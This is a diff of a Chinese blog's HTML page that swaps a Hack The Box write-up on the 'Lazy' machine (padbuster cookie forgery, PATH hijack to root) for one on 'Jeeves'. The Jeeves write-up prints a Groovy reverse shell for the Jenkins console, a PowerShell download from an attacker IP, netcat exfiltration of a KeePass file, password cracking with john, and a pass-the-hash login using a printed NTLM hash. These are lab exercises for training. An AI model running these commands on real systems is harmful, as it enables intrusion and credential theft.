@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>htb之Lazy | Hexo</title>
+  <title>htb之Jeeves | Hexo</title>
   <meta name="keywords" content=" 博客 , htb ">
-  <meta name="description" content="htb之Lazy | Hexo">
+  <meta name="description" content="htb之Jeeves | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="nmap收集信息发现开有53端口和80端口，htb尿性直接添加/etc/hosts bank.htb直接打开bank.htb就是一个硕大的登录框，dirb目录扫描，发现一个很诡异的目录http://bank.htb/support.php 302 打开这个就一直跳向登录框，被重定向了吗用浏览器插件禁止重定向打开http://bank.htb/support.php 就是一个上传框，直接传上后门经过">
 <meta name="keywords" content="博客,htb">
@@ -306,9 +306,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-htb之Lazy" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Jeeves" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">htb之Lazy</h1>
+        <h1 class="article-title">htb之Jeeves</h1>
     
     <div class="article-meta">
         
@@ -332,7 +332,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-11 17:44:26'>2019-11-11 17:17</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-20 15:11:49'>2019-11-20 14:33</time>
         
     </div>
     <div class="article-meta">
@@ -354,7 +354,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Lazy"><span class="toc-text">htb之Lazy</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Jeeves"><span class="toc-text">htb之Jeeves</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -370,24 +370,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Lazy"><a href="#htb之Lazy" class="headerlink" title="htb之Lazy"></a>htb之Lazy</h1><p>nmap 收集信息<br><img src="/images/lazy/1.1.png" alt></p>
-<p>只有一个登陆框，创建完用户可以看到突出一个auth cookie,我将拦截请求发送到转发器，以分析其响应。它提示“无效填充”，这意味着可能存在填充oracle漏洞。<br><img src="/images/lazy/1.2.png" alt></p>
-<p>该命令包含目标URL和上面复制的身份验证cooki</p>
+        <h1 id="htb之Jeeves"><a href="#htb之Jeeves" class="headerlink" title="htb之Jeeves"></a>htb之Jeeves</h1><p>nmap 收集信息<br><img src="/images/jeeves/1.png" alt><br>发现开启有80和50000端口，打开80端口，只看见一个搜索框，随便输入几个字符，直接跳出一张图片<br><img src="/images/jeeves/2.png" alt><br>错误的引导信息，直接去看50000端口<br><img src="/images/jeeves/3.png" alt><br>还是有点东西的，直接爆破目录<br><img src="/images/jeeves/4.png" alt><br>爆破出这几个目录，打开可以看到是一个名为jenkins的项目<br>直接去Google找漏洞<br><a href="https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/" target="_blank" rel="noopener">https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/</a><br>以多方式利用jenkins 脚本控制台的方法<br>直接在脚本控制台弹shell</p>
 <blockquote>
-<p>padbuster <a href="http://10.10.10.18/login.php" target="_blank" rel="noopener">http://10.10.10.18/login.php</a> wiQgvekCJISpjPseG06S%2FLs18d0QcOgo 8 –cookies auth=wiQgvekCJISpjPseG06S%2FLs18d0QcOgo –encoding 0 -plaintext user=admin</p>
+<p>String host=”localhost”;<br>int port=8044;<br>String cmd=”cmd.exe”;<br>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</p>
 </blockquote>
-<p>跑出admin用户cookie之后，直接替换cookie，转换成admin用户<br><img src="/images/lazy/1.png" alt></p>
-<p>转换成admin用户之后，直接就可以看到ssh秘钥，直接连接吧</p>
+<p><img src="/images/jeeves/5.png" alt><br>获取到一个用户shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>一些简单的搜索发现C:\Users\kohsuke\Documents\CEH.kdbx 非常可疑</p>
 <blockquote>
-<p><a href="http://10.10.10.18/mysshkeywithnamemitsos" target="_blank" rel="noopener">http://10.10.10.18/mysshkeywithnamemitsos</a> </p>
+<p>powershell (new-object System.Net.WebClient).DownloadFile( ‘<a href="http://192.168.174.145/ssss2.exe&#39;,&#39;C:\test\update\ssss2.exe&#39;" target="_blank" rel="noopener">http://192.168.174.145/ssss2.exe&#39;,&#39;C:\test\update\ssss2.exe&#39;</a>)<br>传个nc.exe过去方便传输文件<br>目标机传递文件到攻击机<br>nc -l -p 9995 &gt; CEH.kdbx<br>攻击机接收<br>nc 10.10.10.63 9995 &lt; CEH.kdbx</p>
 </blockquote>
-<p>从文件名可以直接看出该系统用户名是mitsos<br>ssh -i ssh.txt <a href="mailto:mitsos@10.10.10.18" target="_blank" rel="noopener">mitsos@10.10.10.18</a></p>
-<p>成功获取到user.txt，在该目录下peda和备份文件，在执行备份的时候，可以看到它打印带有用户哈希值的影子文件 </p>
-<blockquote>
-<p>strings backup</p>
-</blockquote>
-<p>使用strings 查看该文件的backup中可打印的字符串，发现有命令包含在里面 cat /etc/shadow</p>
-<p>现在只要我创建一个可执行的cat文件，即可获取root权限<br>cd /tmp<br>echo “/bin/sh” &gt; cat<br>chmod 777 cat<br>export PATH=/tmp:$PATH<br>再回去执行一下备份文件./backup<br>OKroot</p>
+<p>keepass2john CEH.kdbx<br>生成哈希<br>john 破解此密码<br>john –format=”keepass” –wordlist=/usr/share/wordlists/rockyou.txt hash.txt</p>
+<p>成功破解出密码moonshine1<br>使用keepass管理器查看此文件<br>看到一串NTLM哈希aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00<br>使用传递哈希攻击Metasploit的psexec模块或pth-winexe都可以成功利用<br>pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -397,12 +390,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>htb之Lazy</p>
+    <p><span class="copy-title">文章标题:</span>htb之Jeeves</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-11, 17:17:42</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-11, 17:44:26</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/11/htb之Lazy/" title="htb之Lazy">https://manmachines.github.io/2019/11/11/htb之Lazy/</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-20, 14:33:51</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-20, 15:11:49</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/20/htb之Jeeves/" title="htb之Jeeves">https://manmachines.github.io/2019/11/20/htb之Jeeves/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
